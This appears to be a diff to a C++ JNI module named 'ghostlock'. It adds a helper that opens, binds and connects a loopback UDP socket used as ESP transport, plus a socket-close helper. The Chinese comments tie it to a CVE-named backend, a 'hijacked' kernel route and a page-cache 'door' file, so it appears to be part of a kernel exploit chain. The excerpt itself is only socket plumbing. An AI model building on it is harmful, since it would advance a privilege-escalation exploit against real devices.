@@ -333,5 +333,50 @@ namespace ghostlock::jni {
         return true;
     }
 
+    /**
+     *  建 ESP socket：发送端绑 sa.sender_port，连到 sa.encap_port（对端是内核里那条被劫持的路由）。
+     *
+     *  设备工作（socket/bind/connect）；端口与密钥由会话参数给，本函数不做任何决策。
+     *  @return socket fd；失败 -1。
+     *  @note 照抄 landing/pagecache_door_linux.cpp 的写法：**非限定**的 sockaddr_in/htons/htonl ——
+     *        本 TU 里有 using namespace ghostlock::backend::cve_2026_43284;，带 :: 的限定形式在这里解析失败。
+     *        另：SOCK_CLOEXEC 是 Linux 专有，跨平台只用 SOCK_DGRAM。
+     */
+    int device_connect_esp(const Init43284Values &params) noexcept {
+        const backend::cve_2026_43284::SaMaterial sa = sa_material_of(params);
+        if (!sa.set) {
+            return -1;
+        }
+        const int fd = socket(AF_INET, SOCK_DGRAM, 0);
+        if (fd < 0) {
+            return -1;
+        }
+        sockaddr_in local{};
+        local.sin_family = AF_INET;
+        local.sin_port = htons(sa.sender_port);
+        local.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        if (bind(fd, reinterpret_cast<sockaddr *>(&local), sizeof(local)) != 0) {
+            static_cast<void>(close(fd));
+            return -1;
+        }
+        sockaddr_in peer{};
+        peer.sin_family = AF_INET;
+        peer.sin_port = htons(sa.encap_port);
+        peer.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        if (connect(fd, reinterpret_cast<sockaddr *>(&peer), sizeof(peer)) != 0) {
+            static_cast<void>(close(fd));
+            return -1;
+        }
+        return fd;
+    }
+
+    /** @return 关掉一个 socket；fd < 0 则为 false。 */
+    bool device_close_socket(const int fd) noexcept {
+        if (fd < 0) {
+            return false;
+        }
+        return close(fd) == 0;
+    }
+
 }  // namespace ghostlock::jni
 
